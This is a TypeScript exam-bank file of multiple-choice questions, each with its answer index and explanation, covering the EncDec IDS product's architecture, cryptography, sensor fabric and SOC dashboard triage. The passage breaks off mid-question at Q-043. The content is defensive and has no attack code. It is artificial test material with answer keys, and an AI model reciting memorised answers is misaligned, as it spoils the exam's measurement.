/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import type { ExamQuestion } from '../../src/types.js';

export const EXAM_BANK_PART_1: ExamQuestion[] = [
  // =========================================================================
  // CHAPTER 1: System Architecture & Core Philosophy (Q-001 to Q-022)
  // =========================================================================
  {
    id: 'Q-001',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Why does EncDec IDS pair Deep Packet Inspection (NIDS) with Kernel-level File Integrity Monitoring (HIDS) rather than relying solely on a hardened perimeter NIDS?',
    options: [
      'A standalone NIDS lacks visibility into endpoint process lineage, local privilege escalations, and encrypted host-side payload execution.',
      'Perimeter NIDS appliances cannot parse IPv4 TCP sequence numbers or Layer-4 port bindings.',
      'Host IDS sensors automatically replace TLS termination proxies at enterprise network gateways.',
      'Combining both layers eliminates the need for cryptographic integrity checks on local log files.'
    ],
    correctIndex: 0,
    explanation: 'Standalone NIDS sees wire traffic but lacks OS process-tree lineage and encrypted-tunnel execution context; correlating wire flows with HIDS kernel state eliminates that blind spot.'
  },
  {
    id: 'Q-002',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'EncDec telemetry channels use AES-256-GCM with ephemeral session keys. What catastrophic cryptographic failure occurs if an implementation reuses a 96-bit nonce/IV under the same key across two telemetry frames?',
    options: [
      'The ephemeral Diffie-Hellman modulus degrades from 2048 bits to 512 bits without triggering an alert.',
      'An attacker can XOR ciphertexts to recover plaintext differences and algebraically reconstruct the GHASH authentication key H to forge arbitrary tags.',
      'The AES block cipher automatically falls back to ECB mode without padding oracle resistance.',
      'Cloud Firestore rejects the document due to SHA-256 collision exhaustion.'
    ],
    correctIndex: 1,
    explanation: 'AES-GCM is CTR mode + GHASH; nonce reuse leaks keystream XOR (P1 ⊕ P2 = C1 ⊕ C2) and exposes the authentication subkey H via polynomial root solving, breaking both confidentiality and authenticity.'
  },
  {
    id: 'Q-003',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'In EncDec’s Dual Database Architecture, what distinct architectural responsibility is assigned to Google Cloud Firestore versus Microsoft SQL Server (MSSQL)?',
    options: [
      'Firestore serves as an archive tape backup, while MSSQL streams WebSocket events directly to browser React hooks.',
      'Firestore handles sub-millisecond real-time telemetry streaming and WebSocket distribution, whereas MSSQL provides immutable ACID-compliant relational auditing.',
      'Both databases store identical raw pcap binaries synchronously via two-phase commit before packet forwarding.',
      'MSSQL manages client-side OAuth tokens while Firestore compiles Suricata SID signatures.'
    ],
    correctIndex: 1,
    explanation: 'Firestore powers low-latency real-time cloud distribution; MSSQL enforces relational schemas, indexed enterprise queries, and ACID-compliant audit persistence.'
  },
  {
    id: 'Q-004',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'Why does EncDec isolate raw payload inspection inside dedicated cryptographic sandboxes rather than evaluating untrusted packet bytes inside the main Node.js event loop process memory?',
    options: [
      'To permit unauthenticated external peers to read memory pages over UDP port 514.',
      'To mitigate parser memory corruption, side-channel leakage, and secret key exposure from malformed hostile payloads.',
      'Because AES-256-GCM hardware instructions cannot execute on the same CPU socket as Express routes.',
      'To bypass kernel eBPF verifier bounds checks during high-volume DDoS bursts.'
    ],
    correctIndex: 1,
    explanation: 'Isolating untrusted payload parsing prevents parser vulnerabilities or side-channel probes from reading session secrets, JWT signing keys, or database credentials held in main runtime memory.'
  },
  {
    id: 'Q-005',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Which quartet of telemetry collectors constitutes EncDec’s unified Distributed Sensor Fabric described in Chapter 1?',
    options: [
      'Suricata NIDS, Zeek NSM, Endpoint eBPF Host Agents, and Central Syslog parsers',
      'Wireshark GUI, Squid Cache, Windows Registry Editor, and ICMP Traceroute',
      'Nessus Scanner, Terraform State, Redis PubSub, and Nginx Ingress',
      'OpenVPN, iptables NAT, cron, and SNMPv1 traps'
    ],
    correctIndex: 0,
    explanation: 'EncDec normalizes and correlates events from Suricata NIDS, Zeek NSM, kernel eBPF host agents, and central Syslog parsers.'
  },
  {
    id: 'Q-006',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Under EncDec’s Zero-Trust verification philosophy, how are internal east-west telemetry frames between a sensor node and the central correlation engine treated?',
    options: [
      'Implicitly trusted whenever the source IP belongs to RFC 1918 private address space.',
      'Authenticated, encrypted, and continuously risk-scored regardless of subnet origin.',
      'Forwarded in plaintext over UDP to minimize serialization overhead inside Kubernetes clusters.',
      'Cached in unencrypted browser cookies until an administrator unlocks Admin Gateway.'
    ],
    correctIndex: 1,
    explanation: 'Zero-Trust rejects implicit subnet trust: every packet, process telemetry frame, and syscall stream requires explicit cryptographic authentication and continuous scoring.'
  },
  {
    id: 'Q-007',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'Compared to userspace ptrace-based syscall tracing, why do EncDec Endpoint Host Agents utilize eBPF hooks for kernel telemetry?',
    options: [
      'eBPF allows unsigned arbitrary pointer writes into kernel page tables without bounds verification.',
      'The in-kernel eBPF verifier guarantees termination and memory safety while incurring minimal context-switch overhead.',
      'ptrace cannot observe processes running with UID > 1000 on Ubuntu Linux 22.04 LTS.',
      'eBPF compiles directly to client-side WebAssembly inside Chromium tabs.'
    ],
    correctIndex: 1,
    explanation: 'eBPF runs verified bytecode inside kernel space without stopping target threads on every syscall, eliminating ptrace’s severe double-context-switch latency penalty.'
  },
  {
    id: 'Q-008',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'In EncDec’s layered defense matrix, which combination accurately pairs the Incursion Geo-Radar component with its detection mechanism?',
    options: [
      'TopoJSON & D3 Engine operating on Bézier trajectories for real-time geodesic attack tracing',
      'SHA-256 FIM Engine executing recursive diffing on `/etc/shadow` for rogue daemon scanning',
      'AES-GCM Payload Reassembler computing TCP checksum deltas for DNS poisoning mitigation',
      'MSSQL B-tree Profiler running SQL CLR triggers for GeoIP coordinate triangulation'
    ],
    correctIndex: 0,
    explanation: 'Chapter 1 maps the Incursion Geo-Radar layer to TopoJSON & D3 computing Quadratic Bézier trajectories for real-time geodesic threat attribution.'
  },
  {
    id: 'Q-009',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'What primary forensic advantage does cross-correlating NIDS flow anomalies with HIDS process state changes provide during an encrypted C2 incident?',
    options: [
      'It brute-forces the attacker’s ECDHE private key in sub-millisecond hardware cycles.',
      'It links anomalous outbound TLS metadata/beacons directly to the exact host PID, binary path, and parent process lineage.',
      'It disables TLS 1.3 forward secrecy across all monitored Linux web servers.',
      'It compresses raw packet payloads into plaintext SQL tables without indexing.'
    ],
    correctIndex: 1,
    explanation: 'Even when C2 payload content is TLS-encrypted, correlating network flow periodicity and JA3/SNI metadata with HIDS socket-to-PID ownership identifies the rogue executable.'
  },
  {
    id: 'Q-010',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'In AES-256-GCM authenticated encryption, what property protects encrypted telemetry against silent bit-flipping tampering in transit?',
    options: [
      'PKCS#7 padding validation executed after HMAC-MD5 decryption.',
      'Failure of GHASH authentication tag verification causes the decryptor to reject the message and output no plaintext.',
      'Deterministic ECB block permutation ensures single-bit ciphertext changes corrupt every preceding block cleanly.',
      'Asymmetric RSA signing embedded inside every 16-byte AES round key.'
    ],
    correctIndex: 1,
    explanation: 'AEAD ciphers like AES-GCM compute an integrity tag over Associated Data and ciphertext; any bit modification causes tag verification to fail prior to releasing plaintext.'
  },
  {
    id: 'Q-011',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'When normalizing heterogeneous events from Suricata, Zeek, and eBPF into EncDec’s unified pipeline, why is schema normalization essential?',
    options: [
      'Because Zeek logs TCP state in native PostgreSQL binary format that crashes Express JSON middleware.',
      'So downstream correlation rules can evaluate unified timestamps, source/dest entities, and severity semantics across sensor boundaries.',
      'To strip MITRE ATT&CK identifiers before writing audit records into MSSQL.',
      'Because browsers can only render Canvas pixels if JSON keys are fewer than four characters.'
    ],
    correctIndex: 1,
    explanation: 'Cross-sensor correlation fails if Suricata, Zeek, and eBPF report incompatible field names, timezones, and severity scales; normalization produces a canonical RawSecurityEvent model.'
  },
  {
    id: 'Q-012',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'What distinguishes Zeek NSM’s operational role from Suricata NIDS within the EncDec perimeter architecture?',
    options: [
      'Suricata only parses local Linux auth logs, whereas Zeek acts exclusively as an endpoint antivirus kernel driver.',
      'Suricata emphasizes high-speed signature/rule matching, while Zeek generates rich structured protocol transaction logs (e.g., conn, dns, http) for behavioral analysis.',
      'Zeek blocks packets inline using BGP null-routing, while Suricata builds SVG maps.',
      'Suricata replaces MSSQL persistence during Firestore quota outages.'
    ],
    correctIndex: 1,
    explanation: 'Suricata excels at deterministic signature/heuristic alerting (SIDs), whereas Zeek acts as a network security monitor emitting rich structured transaction telemetry.'
  },
  {
    id: 'Q-013',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'Why are ephemeral session keys preferred over static pre-shared master keys for telemetry channel encryption in EncDec?',
    options: [
      'Ephemeral keys eliminate the need for TLS certificates on external browser dashboards.',
      'Ephemeral keys limit blast radius and preserve forward secrecy if a single session key or node memory snapshot is compromised.',
      'Static master keys cannot mathematically encrypt strings exceeding 4,096 bytes under AES-256.',
      'Ephemeral keys allow Cloud Firestore to decrypt payloads without possessing the decryption key.'
    ],
    correctIndex: 1,
    explanation: 'Rotating ephemeral session keys ensures compromise of one session key cannot retroactively decrypt recorded past telemetry or future rotated sessions.'
  },
  {
    id: 'Q-014',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'How does EncDec maintain fault-tolerant persistence if Cloud Firestore experiences network partitioning or quota exhaustion?',
    options: [
      'It queues alerts exclusively in volatile browser `sessionStorage` until the analyst logs back in.',
      'It triggers automated failover to local persistent storage and MSSQL without dropping incoming alerts.',
      'It suspends NIDS packet capture across all interfaces until cloud connectivity returns.',
      'It downgrades all critical alerts to informational level to reduce database write volume.'
    ],
    correctIndex: 1,
    explanation: 'Fault-tolerant persistence uses circuit-breaker failover to local persistent DB and MSSQL so zero telemetry is lost during cloud disruptions.'
  },
  {
    id: 'Q-015',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Which layer in the EncDec Defense Matrix is primarily responsible for detecting rogue daemons and `/etc/passwd` tampering?',
    options: [
      'Network Layer (NIDS) Packet Sniffer',
      'Host Layer (HIDS) FIM & Process Monitor',
      'Incursion Geo-Radar TopoJSON Engine',
      'Google Workspace RFC 2822 Relay'
    ],
    correctIndex: 1,
    explanation: 'Host Layer (HIDS) performs SHA-256 File Integrity Monitoring (FIM) and inspects process/syscall lineage to catch unauthorized file edits and rogue daemons.'
  },
  {
    id: 'Q-016',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'What risk does "Dual-Write Skew" introduce when simultaneously replicating telemetry across Firestore and MSSQL, and how should an enterprise SOC handle it?',
    options: [
      'Network switches reorder TCP SYN-ACK segments; solved by disabling MSSQL foreign keys.',
      'One store can succeed while the other fails transiently, requiring asynchronous outbox/reconciliation loops and idempotent keys to converge state.',
      'Symmetric encryption keys double in length on every dual write; solved by truncating SHA-256 digests.',
      'Browser WebSockets broadcast duplicate packets to physical NICs; solved by switching to HTTP/1.0 polling.'
    ],
    correctIndex: 1,
    explanation: 'Writing to two heterogeneous databases without distributed 2PC risks partial failure; idempotent document/row IDs and background sync reconciliation ensure eventual convergence without blocking ingestion.'
  },
  {
    id: 'Q-017',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'When an adversary lands via an unpatched web application vulnerability (L7 HTTP), which sequential signal pair proves hybrid correlation is functioning properly?',
    options: [
      'ICMP Echo Reply on localhost paired with a theme switch to Light Mode',
      'NIDS HTTP SQLi/RCE signature match paired with HIDS anomaly showing `www-data` spawning `/bin/bash`',
      'Admin login email paired with offline PDF workbook export',
      'BGP route advertisement paired with MSSQL schema creation'
    ],
    correctIndex: 1,
    explanation: 'Matching an inbound Layer-7 exploit signature (NIDS) with unexpected child shell creation by the web daemon (`www-data` -> `/bin/bash`, HIDS) confirms multi-layer compromise.'
  },
  {
    id: 'Q-018',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Why does EncDec emphasize "encryption/decryption state isolation" in its core philosophy?',
    options: [
      'So cleartext payloads inspected by signature engines never coexist unprotected in memory alongside long-lived cryptographic secrets.',
      'So users must re-enter their password before clicking each chapter paragraph in the workbook.',
      'To convert all JPEG images in email attachments into AES ciphertexts.',
      'Because TLS termination cannot occur inside Linux kernel space.'
    ],
    correctIndex: 0,
    explanation: 'Separating cryptographic key custody from untrusted payload inspection boundaries prevents exploit primitives like Heartbleed-style buffer over-reads from leaking master keys.'
  },
  {
    id: 'Q-019',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'If EncDec inspects 10 Gbps of burst ingress traffic, which design choice prevents signature matching latency from blocking REST API responsiveness on the control plane?',
    options: [
      'Executing synchronous fsync() SQL inserts inside the NIC packet capture callback thread.',
      'Decoupling high-throughput packet/sensor ingestion from asynchronous persistence and WebSocket broadcast pipelines.',
      'Requiring human operator confirmation before parsing every TCP ACK packet.',
      'Storing complete packet hex dumps inside JWT authentication headers.'
    ],
    correctIndex: 1,
    explanation: 'Non-blocking decoupled ingestion queues isolate line-rate packet analysis from slower relational disk writes and UI fanout.'
  },
  {
    id: 'Q-020',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'In EncDec’s architecture, which component converts uncorrelated alerts into prioritized multi-stage kill-chain narratives?',
    options: [
      'The Certificate PDF Vector Renderer',
      'The Multi-Stage Correlation & Triaging Engine',
      'The RFC 2822 Base64 Encoder',
      'The Dual-Theme CSS Variable Switcher'
    ],
    correctIndex: 1,
    explanation: 'The Multi-Stage Correlated Triaging engine aggregates related Suricata, Zeek, eBPF, and Syslog events into coherent kill-chain Incidents.'
  },
  {
    id: 'Q-021',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Hard',
    question: 'Why must Host IDs, timestamps, and rule references be strictly typed in EncDec’s unified persistence layer?',
    options: [
      'To permit arbitrary unvalidated SQL injection strings during MSSQL queries.',
      'To preserve referential traceability during forensic audits and prevent cross-tenant ownership spoofing.',
      'Because JavaScript arrays lose elements unless every object has identical memory alignment.',
      'To ensure TopoJSON renders Mercator coastlines instead of Natural Earth.'
    ],
    correctIndex: 1,
    explanation: 'Strict metadata schema ensures auditability, enforces host-ownership isolation across analysts, and maintains relational integrity in MSSQL.'
  },
  {
    id: 'Q-022',
    chapterNumber: 1,
    topic: 'Chapter 1: System Architecture & Core Philosophy',
    difficulty: 'Advanced',
    question: 'Suppose a stealth attacker slows a port sweep to 1 packet every 15 minutes from a single source while tampering with a systemd unit file locally. Which EncDec subsystem catches the persistence phase immediately?',
    options: [
      'NIDS HTTP Layer-7 Flood detector',
      'HIDS File Integrity Monitoring (FIM) & Process Monitor',
      'Client-side OAuth token expiry banner',
      'DNS Cache Poisoning transaction ID analyzer'
    ],
    correctIndex: 1,
    explanation: 'Low-and-slow recon may evade volumetric NIDS thresholds, but modifying `/bin/systemd` or service unit files immediately alters cryptographic baselines detected by HIDS FIM.'
  },

  // =========================================================================
  // CHAPTER 2: SOC Overview Dashboard & Executive Telemetry (Q-023 to Q-044)
  // =========================================================================
  {
    id: 'Q-023',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'In EncDec’s SOC Overview Threat Level Index (0–100), what exact numeric thresholds define Guarded Amber versus Critical Crimson?',
    options: [
      'Nominal Cyan 0–25, Guarded Amber 26–60, High Orange 61–80, Critical Crimson 81–100',
      'Nominal Cyan 0–10, Guarded Amber 11–50, High Orange 51–75, Critical Crimson 76–100',
      'Nominal Cyan 0–30, Guarded Amber 31–70, High Orange 71–90, Critical Crimson 91–100',
      'Nominal Cyan 0–20, Guarded Amber 21–40, High Orange 41–79, Critical Crimson 80–100'
    ],
    correctIndex: 0,
    explanation: 'Chapter 2 explicitly defines the four Threat Level Index bands: Nominal Cyan (0–25), Guarded Amber (26–60), High Orange (61–80), and Critical Crimson (81–100).'
  },
  {
    id: 'Q-024',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Why does marking an alert as "Ignore / False Positive" in EncDec preserve the record in persistent logs instead of deleting it from the database?',
    options: [
      'Because Cloud Firestore disables document deletion on Spark plans.',
      'To preserve an immutable audit trail for compliance verification, false-positive tuning, and retrospective threat hunting.',
      'So the Threat Level Index keeps inflating until it reaches 100.',
      'Because RFC 2822 requires ignored alerts to be emailed every 60 seconds.'
    ],
    correctIndex: 1,
    explanation: 'Deleting suppressed alerts would destroy forensic evidence and violate SOC compliance; "ignored" removes noise from active triage while keeping an auditable log entry.'
  },
  {
    id: 'Q-025',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'An unhandled alert sits in the queue with Threat Level Index = 74. Which dashboard band is active, and which two operator actions directly alter active triage pressure vs. escalation status?',
    options: [
      'Guarded Amber; deleting the host and resetting MSSQL lowers the score.',
      'High Orange; "Resolve" closes containment pressure while "Escalate" elevates to senior IR with an audit entry.',
      'Critical Crimson; "Ignore" triggers autonomous SIGKILL on all client nodes.',
      'Nominal Cyan; "Gmail Dispatch" automatically drops border BGP routes.'
    ],
    correctIndex: 1,
    explanation: 'Score 74 lies in High Orange (61–80); Resolving marks containment complete (reducing unhandled threat weight), while Escalating routes priority to senior Incident Response.'
  },
  {
    id: 'Q-026',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Which three core inputs directly weight EncDec’s dynamic Threat Level Index calculation?',
    options: [
      'Browser theme selection, PDF export count, and certificate verification hashes',
      'Weighted active alerts, anomalous packet volume, and unhandled critical intrusions',
      'DNS TTL length, workstation screen resolution, and OAuth refresh mode',
      'CPU fan RPM, user display-name length, and localStorage quota'
    ],
    correctIndex: 1,
    explanation: 'EncDec computes the Threat Level Index from weighted active alerts, anomalous packet volume, and unhandled critical intrusions.'
  },
  {
    id: 'Q-027',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'When an operator clicks "Gmail Dispatch" on an active SOC alert row, what technical pre-population workflow occurs?',
    options: [
      'An unencrypted plain socket opens on TCP port 25 directly from the browser.',
      'An official RFC 2822 incident notification template is pre-populated for dispatch via connected Google Workspace.',
      'The alert is converted into a SHA-256 certificate QR code.',
      'The source IP is permanently removed from firewall blocklists.'
    ],
    correctIndex: 1,
    explanation: 'Clicking Gmail Dispatch pre-fills an official RFC 2822 incident notice with alert telemetry for authorized dispatch through Google Workspace.'
  },
  {
    id: 'Q-028',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'During a high-volume false-positive storm caused by an internal vulnerability scanner, what happens to the SOC Threat Level Index if a junior analyst clicks "Resolve" versus "Ignore / False Positive"?',
    options: [
      'Both erase the scanner logs from MSSQL; neither writes an audit trail.',
      '"Ignore / False Positive" documents benign suppression for rule tuning without claiming remediation occurred, whereas "Resolve" asserts threat containment was executed.',
      '"Resolve" disables NIDS globally across all sensors, whereas "Ignore" blocks the scanner IP permanently.',
      'Neither action affects Threat Level Index or writes to the audit trail.'
    ],
    correctIndex: 1,
    explanation: 'Distinguishing false-positive suppression ("ignored") from verified mitigation ("resolved") is critical for accurate SOC KPI reporting and rule-tuning accuracy.'
  },
  {
    id: 'Q-029',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Why must every operator triage click (Escalate, Ignore, Resolve) emit a timestamped immutable audit log entry?',
    options: [
      'To establish non-repudiation and accountability showing which authenticated operator altered alert disposition and when.',
      'Because WebSockets disconnect unless a PostgreSQL row is inserted every second.',
      'To bypass role-based access control checks on administrative endpoints.',
      'To force the browser to re-authenticate via Google Identity Services popups.'
    ],
    correctIndex: 0,
    explanation: 'SOC accountability and regulatory standards (SOC 2, ISO 27001, NIST SP 800-53) require non-repudiable attribution for every alert state transition.'
  },
  {
    id: 'Q-030',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Which quartet of executive metrics is prominently monitored on the SOC Overview live telemetry gauges?',
    options: [
      'Total Ingress Packets, Active Monitored Hosts, Detected Anomalies, and Rule Engine Compliance',
      'GPU Shader FPS, SMTP Retry Count, Certificate Font Size, and Total Cookies',
      'RAM CAS Latency, BIOS Version, Mouse Click Velocity, and DNS MX Weight',
      'Total Paid Invoices, Light-Mode Contrast Ratio, LocalStorage Bytes, and Active Passkeys'
    ],
    correctIndex: 0,
    explanation: 'Chapter 2 highlights four executive gauges: Total Ingress Packets, Active Monitored Hosts, Detected Anomalies, and Rule Engine Compliance.'
  },
  {
    id: 'Q-031',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'If an analyst views the SOC Overview under multi-tenant host isolation, why must alert filtering validate `ownerId` / host ownership server-side before streaming alerts to the dashboard?',
    options: [
      'To ensure D3 GeoNaturalEarth1 centers solely on Europe.',
      'To prevent Insecure Direct Object Reference (IDOR) telemetry leakage of unrelated tenants’ sensitive IPs and incidents.',
      'Because client browsers cannot filter arrays longer than 100 items.',
      'To reduce RFC 2822 base64 header length.'
    ],
    correctIndex: 1,
    explanation: 'Enforcing tenant/host ownership filtering on the backend API prevents non-admin analysts from viewing another operator’s hosts, vulnerabilities, or internal IP topology.'
  },
  {
    id: 'Q-032',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'When the Threat Level Index crosses from 60 into 62, how does the executive gauge communicate heightened operational urgency?',
    options: [
      'Transitions from Nominal Cyan to Guarded Amber',
      'Transitions from Guarded Amber to High Orange',
      'Transitions from High Orange to Critical Crimson',
      'Resets back to 0 to avoid analyst alarm fatigue'
    ],
    correctIndex: 1,
    explanation: 'Guarded Amber spans 26–60 and High Orange spans 61–80, so crossing 60 to 62 shifts the indicator from Guarded Amber to High Orange.'
  },
  {
    id: 'Q-033',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'What metadata fields accompany each Active Incident alert row on the SOC Overview screen to enable rapid triage?',
    options: [
      'Timestamp, Source IP/Host, Threat Category, and Severity',
      'Kernel Compile Flags, Monitor Refresh Rate, and SSH RSA Modulus',
      'Candidate Middle Name, PDF Page Count, and QR Error Level',
      'Firestore Billing Tier, Local Port Offset, and Canvas DPI'
    ],
    correctIndex: 0,
    explanation: 'Alert rows surface Timestamp, Source IP/Host, Threat Category, and Severity for immediate contextual decision-making.'
  },
  {
    id: 'Q-034',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'An analyst observes Threat Level Index = 89 alongside a surge of unhandled critical alerts. Which workflow sequence follows disciplined Tier-1/Tier-2 SOC procedure?',
    options: [
      'Bulk-ignore all critical alerts to restore Nominal Cyan, then download the offline workbook PDF.',
      'Escalate verified critical alerts to Senior IR, dispatch RFC 2822 owner notices, validate containment, and Resolve only after mitigation verification.',
      'Delete the monitored hosts from Fleet Registry so anomaly counts drop to zero.',
      'Switch MSSQL from SQL auth to Windows auth while halting packet capture.'
    ],
    correctIndex: 1,
    explanation: 'Proper IR escalates verified critical intrusions, notifies asset owners, confirms technical containment, and resolves only post-verification.'
  },
  {
    id: 'Q-035',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Why does EncDec update Threat Level Index dynamically via incoming packet/host telemetry streams rather than requiring periodic manual page reloads?',
    options: [
      'Manual reloads corrupt TopoJSON country polygons.',
      'Reducing Mean Time to Detect (MTTD) requires immediate operator visibility as network anomalies and host tampering unfold.',
      'HTTP GET requests are disabled once a user authenticates.',
      'JWT tokens expire whenever F5 is pressed in the browser.'
    ],
    correctIndex: 1,
    explanation: 'Real-time WebSocket and stream updates minimize MTTD by surfacing high-velocity attacks within seconds of sensor detection.'
  },
  {
    id: 'Q-036',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Which Threat Level Index range indicates "Nominal Cyan" baseline health on the SOC Overview console?',
    options: [
      '0–25',
      '26–60',
      '61–80',
      '81–100'
    ],
    correctIndex: 0,
    explanation: 'Nominal Cyan covers scores from 0 to 25.'
  },
  {
    id: 'Q-037',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'If an automated penetration test triggers 400 medium-severity port scan alerts, why should a rule compliance gauge evaluate enabled rule coverage rather than blind alert volume?',
    options: [
      'Because high alert volume proves database indexes are fragmented.',
      'Rule compliance verifies active defensive signatures/sensors remain armed and unbroken, whereas raw alert count alone fluctuates with external probing.',
      'Because port scans cannot occur over TCP.',
      'Because enabled rules automatically drop all HTTPS traffic.'
    ],
    correctIndex: 1,
    explanation: 'Rule Engine Compliance tracks sensor/signature enforcement integrity; distinguishing rule posture from probe volume prevents misleading operational metrics.'
  },
  {
    id: 'Q-038',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'What happens in the audit log when an analyst uses the one-click "Escalate" handler on an alert?',
    options: [
      'No audit log is created until the alert is later resolved.',
      'An immutable, timestamped audit entry records the escalation priority and transmitting operator.',
      'The alert is deleted from `EncDec_SecurityAlerts` and moved solely to browser memory.',
      'The analyst’s role is downgraded automatically to auditor.'
    ],
    correctIndex: 1,
    explanation: 'Every triage handler—Escalate, Ignore, Resolve—generates an immutable, timestamped audit log.'
  },
  {
    id: 'Q-039',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Why does SOC Overview integrate the dynamic TopoJSON map alongside alert rows and numeric gauges?',
    options: [
      'To replace cryptographic password hashing with geographic IP allowlists.',
      'To unify spatial attack origin awareness with real-time quantitative threat telemetry on one tactical command screen.',
      'To export PNG screenshots for NOWPayments invoice settlement.',
      'To disable Suricata rule sets outside North America.'
    ],
    correctIndex: 1,
    explanation: 'Combining geographic origin trajectories, quantitative gauges, and actionable alert queues maximizes situational awareness on a single pane.'
  },
  {
    id: 'Q-040',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'In a busy SOC, what danger arises from "alert fatigue" if analysts lack an "Ignore / False Positive" suppression state backed by audit logs?',
    options: [
      'TCP sequence numbers wrap around past 2^32 faster than expected.',
      'True positive critical intrusions get buried under noisy repetitive alerts, degrading response times and missing real compromises.',
      'Cloud Firestore upgrades automatically to Enterprise SQL without approval.',
      'AES-256-GCM decrypts packets into XML.'
    ],
    correctIndex: 1,
    explanation: 'Structured suppression with auditability clears repetitive benign noise from active triage queues so critical true positives receive immediate attention.'
  },
  {
    id: 'Q-041',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Which operator action signals that technical mitigation and verification for an incident alert are complete?',
    options: [
      'Ignore / False Positive',
      'Escalate',
      'Resolve',
      'Export Workbook PDF'
    ],
    correctIndex: 2,
    explanation: '"Resolve" formally marks containment and mitigation complete after defensive actions have succeeded.'
  },
  {
    id: 'Q-042',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'Why does the SOC Overview Threat Level Index weight unhandled critical intrusions more heavily than low-severity informational events?',
    options: [
      'Because low-severity alerts have shorter database UUIDs.',
      'Because unhandled critical intrusions carry immediate risk of lateral movement, data exfiltration, or service disruption requiring urgent prioritization.',
      'Because informational events cannot be transmitted over TLS.',
      'Because MSSQL rejects integers below 25.'
    ],
    correctIndex: 1,
    explanation: 'Risk-weighted scoring ensures high-impact uncontained threats drive executive urgency rather than benign background telemetry.'
  },
  {
    id: 'Q-043',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Advanced',
    question: 'When dispatching an alert notification via Gmail Dispatch to a system owner, which core telemetry items prevent ambiguity during emergency containment?',
    options: [
